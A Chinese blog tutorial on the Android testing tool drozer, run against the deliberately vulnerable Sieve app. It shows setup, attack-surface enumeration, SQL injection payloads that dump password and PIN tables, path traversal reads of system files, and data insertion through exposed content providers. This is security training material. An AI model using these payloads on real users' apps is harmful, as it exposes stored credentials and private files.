<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="tea9">


    <meta name="subtitle" content="加油">


    <meta name="description" content="心中有光の孩子 tips：图片都存到了github仓库需要<魔法网络>才能看到">


    <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">


<title>android-drozer | tea9のblog</title>



    <link rel="icon" href="/img/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Tea9&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/links">Links</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Tea9&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/links">Links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <!--评论-->
    <script src="https://giscus.app/client.js"
        data-repo="tea9/tea9_giscus"
        data-repo-id="R_kgDOMsAxBg"
        data-category="Announcements"
        data-category-id="DIC_kwDOMsAxBs4CiKYB"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="purple_dark"
        data-lang="zh-CN"
        crossorigin="anonymous"
        async>
    </script>
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">android-drozer</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">tea9</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">十一月 1, 2020&nbsp;&nbsp;9:13:02</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Security/">Security</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="android-drozer"><a href="#android-drozer" class="headerlink" title="android_drozer"></a>android_drozer</h1><p><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/drozer">https://github.com/FSecureLABS/drozer</a><br><a target="_blank" rel="noopener" href="https://www.mwrinfosecurity.com/system/assets/559/original/mwri_drozer-users-guide_2013-09-11.pdf">参考文档</a><br><a target="_blank" rel="noopener" href="https://labs.f-secure.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf">文档</a>  </p>
<h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>mumu模拟器或root过的手机<br>adb<br>python2.7<br>jdk  </p>
<p>我的环境</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~ » python -V                                              tea@teadeMacBook-Pro</span><br><span class="line">Python 2.7.13</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">~ » java -version                                          tea@teadeMacBook-Pro</span><br><span class="line">java version &quot;1.7.0_80&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.7.0_80-b15)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 24.80-b11, mixed mode)</span><br></pre></td></tr></table></figure>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>docker</strong><br><a target="_blank" rel="noopener" href="https://hub.docker.com/r/kengannonmwr/drozer_docker">https://hub.docker.com/r/kengannonmwr/drozer_docker</a><br>没有试过可以安装试试看</p>
<p><strong>win：</strong><br><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/drozer/releases">https://github.com/FSecureLABS/drozer/releases</a><br>安装drozer-2.4.4.win32.msi</p>
<p><strong>mac：</strong><br>安装python2<br>pyenv install 2.7.17<br>pyenv local 2.7.17</p>
<p>-安装drozer<br>下载<br><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/drozer/releases">https://github.com/FSecureLABS/drozer/releases</a><br>drozer-2.4.4-py2-none-any.whl<br>sudo pip install drozer-2.4.4-py2-none-any.whl</p>
<p>-安装 drozer-agent-2.3.4.apk<br><a target="_blank" rel="noopener" href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk</a></p>
<p>打开Embedded Server<br><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/38/1.png"></p>
<p>-转发<br>mumu模拟器链接不上了<br><a target="_blank" rel="noopener" href="http://mumu.163.com/2017/12/19/25241_730476.html">adb如何连接mumu模拟器</a><br>adb kill-server &amp;&amp; adb server &amp;&amp; adb shell</p>
<p>adb forward tcp:31415 tcp:31415 </p>
<p>-进入drozer控制台<br>drozer console connect</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">~/Downloads » drozer console connect                       tea@teadeMacBook-Pro</span><br><span class="line">/Users/tea/.pyenv/versions/2.7.17/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.</span><br><span class="line">  from cryptography import x509</span><br><span class="line">:0: UserWarning: You do not have a working installation of the service_identity module: &#x27;No module named service_identity&#x27;.  Please install it from &lt;https://pypi.python.org/pypi/service_identity&gt; and make sure all of its dependencies are satisfied.  Without the service_identity module, Twisted can perform only rudimentary TLS client hostname verification.  Many valid certificate/hostname mappings may be rejected.</span><br><span class="line">Selecting b58079c46c8716e4 (Netease MuMu 6.0.1)</span><br><span class="line"></span><br><span class="line">            ..                    ..:.</span><br><span class="line">           ..o..                  .r..</span><br><span class="line">            ..a..  . ....... .  ..nd</span><br><span class="line">              ro..idsnemesisand..pr</span><br><span class="line">              .otectorandroidsneme.</span><br><span class="line">           .,sisandprotectorandroids+.</span><br><span class="line">         ..nemesisandprotectorandroidsn:.</span><br><span class="line">        .emesisandprotectorandroidsnemes..</span><br><span class="line">      ..isandp,..,rotectorandro,..,idsnem.</span><br><span class="line">      .isisandp..rotectorandroid..snemisis.</span><br><span class="line">      ,andprotectorandroidsnemisisandprotec.</span><br><span class="line">     .torandroidsnemesisandprotectorandroid.</span><br><span class="line">     .snemisisandprotectorandroidsnemesisan:</span><br><span class="line">     .dprotectorandroidsnemesisandprotector.</span><br><span class="line"></span><br><span class="line">drozer Console (v2.4.4)</span><br><span class="line">dz&gt; </span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装待测试app<br><a target="_blank" rel="noopener" href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk">https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk</a></p>
<p>列出所有app<br>run app.package.list</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.list</span><br><span class="line">com.android.providers.telephony (移动网络配置)</span><br><span class="line">com.android.providers.calendar (日历存储)</span><br><span class="line">com.netease.nemu_vinput.nemu (nemu-vinput)</span><br><span class="line">com.android.providers.media (媒体存储)</span><br><span class="line">com.android.wallpapercropper (com.android.wallpapercropper)</span><br><span class="line">com.android.documentsui (文档)</span><br><span class="line">com.android.galaxy4 (Black Hole)</span><br><span class="line">com.android.externalstorage (外部存储设备)</span><br><span class="line">com.android.htmlviewer (HTML 查看程序)</span><br><span class="line">com.android.quicksearchbox (搜索)</span><br><span class="line">com.android.mms.service (MmsService)</span><br><span class="line">com.android.providers.downloads (下载管理程序)</span><br><span class="line">com.android.browser (浏览器)</span><br><span class="line">com.android.defcontainer (软件包权限帮助程序)</span><br></pre></td></tr></table></figure>

<p>获取设备上的app的包名 -f根据app关键字参数查找<br>run app.package.list -f sieve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.list -f sieve</span><br><span class="line">com.mwr.example.sieve (Sieve)</span><br></pre></td></tr></table></figure>
<p>获取Sieve的一些基本信息<br>run app.package.info -a com.mwr.example.sieve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Application Label: Sieve</span><br><span class="line">  Process Name: com.mwr.example.sieve</span><br><span class="line">  Version: 1.0</span><br><span class="line">  Data Directory: /data/user/0/com.mwr.example.sieve</span><br><span class="line">  APK Path: /data/app/com.mwr.example.sieve-1/base.apk</span><br><span class="line">  UID: 10038</span><br><span class="line">  GID: [3003]</span><br><span class="line">  Shared Libraries: null</span><br><span class="line">  Shared User ID: null</span><br><span class="line">  Uses Permissions:</span><br><span class="line">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.INTERNET</span><br><span class="line">  Defines Permissions:</span><br><span class="line">  - com.mwr.example.sieve.READ_KEYS</span><br><span class="line">  - com.mwr.example.sieve.WRITE_KEYS</span><br><span class="line"></span><br><span class="line">dz&gt;</span><br></pre></td></tr></table></figure>
<p>确定攻击面<br>run app.package.attacksurface com.mwr.example.sieve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br><span class="line">Attack Surface:</span><br><span class="line">  3 activities exported</span><br><span class="line">  0 broadcast receivers exported</span><br><span class="line">  2 content providers exported</span><br><span class="line">  2 services exported</span><br><span class="line">    is debuggable</span><br></pre></td></tr></table></figure>
<p>获取activity信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a com.mwr.example.sieve</span><br><span class="line"></span><br><span class="line">dz&gt; run app.activity.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.FileSelectActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.MainLoginActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.PWList</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure>
<p>启动activity</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity</span><br><span class="line">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure>

<p>枚举provider<br>run app.provider.info -a com.mwr.example.sieve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Authority: com.mwr.example.sieve.DBContentProvider</span><br><span class="line">    Read Permission: null</span><br><span class="line">    Write Permission: null</span><br><span class="line">    Content Provider: com.mwr.example.sieve.DBContentProvider</span><br><span class="line">    Multiprocess Allowed: True</span><br><span class="line">    Grant Uri Permissions: False</span><br><span class="line">    Path Permissions:</span><br><span class="line">      Path: /Keys</span><br><span class="line">        Type: PATTERN_LITERAL</span><br><span class="line">        Read Permission: com.mwr.example.sieve.READ_KEYS</span><br><span class="line">        Write Permission: com.mwr.example.sieve.WRITE_KEYS</span><br><span class="line">  Authority: com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">    Read Permission: null</span><br><span class="line">    Write Permission: null</span><br><span class="line">    Content Provider: com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">    Multiprocess Allowed: True</span><br><span class="line">    Grant Uri Permissions: False</span><br></pre></td></tr></table></figure>
<p>扫描可用的uri<br>run app.provider.finduri com.mwr.example.sieve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.finduri com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">content://com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">content://com.mwr.example.sieve.DBContentProvider/Keys</span><br></pre></td></tr></table></figure>

<p>先运行sieve添加密码后才有数据<br>查找可以访问Content Provider的URI（数据泄漏）<br>run scanner.provider.finduris -a com.mwr.example.sieve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider/Keys</span><br><span class="line"></span><br><span class="line">Accessible content URIs:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">dz&gt; </span><br></pre></td></tr></table></figure>



<p>检查是否有sql注入<br>run scanner.provider.injection -a com.mwr.example.sieve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.provider.injection -a com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Not Vulnerable:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">  content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider</span><br><span class="line">  content://com.mwr.example.sieve.FileBackupProvider</span><br><span class="line"></span><br><span class="line">Injection in Projection:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line"></span><br><span class="line">Injection in Selection:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">dz&gt;</span><br></pre></td></tr></table></figure>
<p>通过暴露的数据接口插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.insert content://com.mx.browser.browserprovider/bookmark/ -&lt;br&gt;</span><br><span class="line">-integer _id 6 --string title Taobao --string url http://**.**.**.**/ --integ&lt;br&gt;</span><br><span class="line">er parent 0</span><br></pre></td></tr></table></figure>


<p>执行SQL注入，Android操作系统建议使用SQLite数据库存储用户数据。SQLite数据库使用SQL语句，所以可以进行SQL注入。 使用projection参数和seleciton参数可以传递一些简单的SQL注入语句到Content provider。如：  </p>
<p>run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; –projection “‘“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span><br><span class="line">unrecognized token: &quot;&#x27; FROM Passwords&quot; (code 1): , while compiling: SELECT &#x27; FROM Passwords</span><br></pre></td></tr></table></figure>
<p>run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; –selection “‘“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &quot;&#x27;&quot;</span><br><span class="line">unrecognized token: &quot;&#x27;)&quot; (code 1): , while compiling: SELECT * FROM Passwords WHERE (&#x27;)</span><br></pre></td></tr></table></figure>
<p>上面两条命令执行后Android设备返回了非常详细的错误信息。使用Sql注入列出数据库中的所有数据表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span><br><span class="line">| type  | name             | tbl_name         | rootpage | sql                                                                                              |</span><br><span class="line">| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                      |</span><br><span class="line">| table | Passwords        | Passwords        | 4        | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |</span><br><span class="line">| table | Key              | Key              | 5        | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )                                           |</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用SQL注入列出数据表的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;—&quot;</span><br><span class="line">| Password         | pin  |</span><br><span class="line">| qwertyuiopasdfgh | 1234 |</span><br></pre></td></tr></table></figure>

<p>查看 URI 的数据信息<br>run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; –vertical</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</span><br><span class="line">     _id  1</span><br><span class="line"> service  1</span><br><span class="line">username  1</span><br><span class="line">password  6yBrYE5xVz93mi7Ve9KKKBGjYMGt8uY= (Base64-encoded)</span><br><span class="line">   email  1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看数据库所有表信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span><br><span class="line">| type  | name             | tbl_name         | rootpage | sql                                                                                              |</span><br><span class="line">| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                      |</span><br><span class="line">| table | Passwords        | Passwords        | 4        | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |</span><br><span class="line">| table | Key              | Key              | 5        | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )                                           |</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看单张数据表数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span><br><span class="line">| Password         | pin  |</span><br><span class="line">| qwertyuiopasdfgh | 1234 |</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>检查是否存在遍历文件的漏洞<br>run scanner.provider.traversal -a com.mwr.example.sieve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Not Vulnerable:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider</span><br><span class="line"></span><br><span class="line">Vulnerable Providers:</span><br><span class="line">  content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line">  content://com.mwr.example.sieve.FileBackupProvider</span><br></pre></td></tr></table></figure>
<p>手动测试目录遍历漏洞：<br>读取指定路径文件内容：<br>run app.provider.read contentProviderURI+filePath</p>
<p>run app.provider.read content:&#x2F;&#x2F;com.mwr.example.sieve.FileBackupProvider&#x2F;etc&#x2F;hosts</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1             ip6-localhos</span><br></pre></td></tr></table></figure>

<hr>
<p>下载安装包目录下指定目录下的文件：run app.provider.download contentProviderURI+filePath exportPath</p>
